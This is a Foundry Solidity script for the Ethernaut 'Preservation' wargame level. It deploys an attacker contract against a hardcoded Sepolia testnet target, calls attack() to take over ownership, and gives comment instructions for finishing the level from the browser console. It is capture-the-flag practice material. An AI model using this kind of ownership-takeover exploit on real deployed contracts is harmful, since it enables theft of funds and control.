// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "src/16_Preservation/Level.sol";
import "src/16_Preservation/Attacker.sol";

contract PreservationScript is Script {
    function setUp() public {}

    //COMMANDS:
    //source .env 
    //forge script script/15_Preservation.s.sol:PreservationScript --rpc-url $SEPOLIA_RPC_URL --broadcast -vvvv
    function run() public {
        uint256  deployerPrivateKey = vm.envUint("SEPOLIA_PRIVATE_KEY");
        vm.startBroadcast(deployerPrivateKey);
        Chain memory sepolia = getChain("sepolia");    
        Preservation target = Preservation(0x25D08C11e4297C57f95aAb2D909D6a6964A8c96B);
        Attacker attacker = new Attacker(address(target));
        attacker.attack();
        //Note: this will change the owner but will not clear the level because you need to change to a specific owner.
        // To clear level, first execute the script and get the attacker_address.
        // Then call the following function in ethernaut website console: 
        //sendTransaction({from: player, to: '<attacker_address>', data: '0x9e5faafc'}) where data is the encoded "attack()" signature.
    }
}
